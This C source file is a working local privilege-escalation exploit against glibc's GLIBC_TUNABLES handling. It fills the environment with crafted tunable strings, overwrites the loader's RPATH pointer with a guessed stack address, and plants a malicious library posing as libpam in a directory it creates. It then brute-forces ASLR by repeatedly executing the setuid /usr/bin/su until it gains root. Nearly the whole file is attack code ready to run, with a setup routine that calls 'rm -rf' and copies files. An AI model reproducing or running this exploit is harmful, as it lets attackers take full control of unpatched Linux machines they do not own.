#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/stat.h>
#include <sys/wait.h>

#define ENV_ITEM_SIZE ((32*4096) - 1)

// No ASLR
//#define STACK_TARGET   0x00007ffffff0c808
// ASLR Brute
#define STACK_TARGET   0x00007ffdfffff018

char * p64(uint64_t val) {
    char * ret = malloc(8);
    memset(ret, 0, 8);
    memcpy(ret, &val, 8);
    ret[7] = 0;
    return ret;
}

char * allocation_helper(const char * base, int size, char fill) {
    char * ret = NULL;
    char * chunk = malloc(size + 1);
    memset(chunk, fill, size);
    chunk[size] = 0;
    asprintf(&ret, "%s%s", base, chunk);
    free(chunk);
    return ret;
}

char * create_u64_filler(uint64_t val, size_t size) {
    uint64_t * ret = malloc(size + 1);
    // We need to make sure the allocation does not contain a premature null byte
    memset(ret, 0x41, size);
    for (int i = 0; i < size / 8; i++) {
        ret[i] = val;
    }
    // force null-termination
    char* ret2 = (char*)ret;
    ret2[size] = 0;
    return ret2;
}

void setup_dir() {
    // TODO: This is very much not compatible with all distros
    system("rm -rf ./\x55");
    mkdir("./\x55", 0777);
    system("cp /usr/lib/x86_64-linux-gnu/libc.so.6 ./\x55/libc.so.6");
    system("cp ./suid_lib.so ./\x55/libpam.so.0");
    system("cp ./suid_lib.so ./\x55/libpam_misc.so.0");
}

int main(int argc, char** argv) {

    setup_dir();

    int num_empty = 0x1000;
    int env_num = num_empty + 0x11 + 1;
    char ** new_env = malloc((sizeof(char *) * env_num) + 1);
    memset(new_env, 0, (sizeof(char *) * env_num) + 1);
    printf("new_env: %p\n", new_env);

    if (new_env == NULL) {
        printf("malloc failed\n");
        exit(1);
    }

    // This is purely vibes based. Could probably be a lot better.
    const char * normal = "GLIBC_TUNABLES=";
    const char * normal2 = "GLIBC_TUNABLES=glibc.malloc.mxfast:";
    const char * overflow = "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=";
    int i = 0;
    // Eat the RW section of the binary, so our next allocations get a new mmap
    new_env[i++] = allocation_helper(normal, 0xd00, 'x');
    new_env[i++] = allocation_helper(normal, 0x1000 - 0x20, 'A');
    new_env[i++] = allocation_helper(overflow, 0x4f0, 'B');
    new_env[i++] = allocation_helper(overflow, 0x1, 'C');
    new_env[i++] = allocation_helper(normal2, 0x2, 'D');

    // the remaining env is empty strings
    for (; i < env_num; i++) {
        new_env[i] = "";

        if (i > num_empty)
            break;
    }

    // This overwrites l->l_info[DT_RPATH] with a pointer to our stack guess.
    new_env[0xb8] = p64(STACK_TARGET);

    // Create some -0x30 allocations to target a stray 0x55 byte to use as our R path.
    for (; i < env_num - 1; i++) {
        new_env[i] = create_u64_filler(0xffffffffffffffd0, ENV_ITEM_SIZE);
    }
    new_env[i-1] = "12345678901"; // padding to allign the -0x30's

    printf("Done setting up env\n");

    char * new_argv[3] = {0};
    new_argv[0] = "/usr/bin/su";
    // If we get a "near miss", we want to make sure su exits with an error code.
    // This happens when the guessed stack address is valid, but points to another (empty) string.
    new_argv[1] = "--lmao";

    printf("[+] Starting bruteforce!\n");
    int attempts = 0;
    while (1) {
        attempts++;

        if (attempts % 100 == 0)
            printf("\n[+] Attempt %d\n", attempts);

        int pid = fork();
        if (pid < 0) {
            perror("fork");
            exit(1);
        }

        if (pid) {
            // check if our child was successful.
            int status = 0;
            waitpid(pid, &status, 0);
            if (status == 0) {
                puts("[+] Goodbye");
                exit(0);
            }
            printf(".");
            fflush(stdout);
        } else {
            // we are the child, let's try to exec su
            int rc = execve(new_argv[0], new_argv, new_env);
            perror("execve");
        }

    }
    
}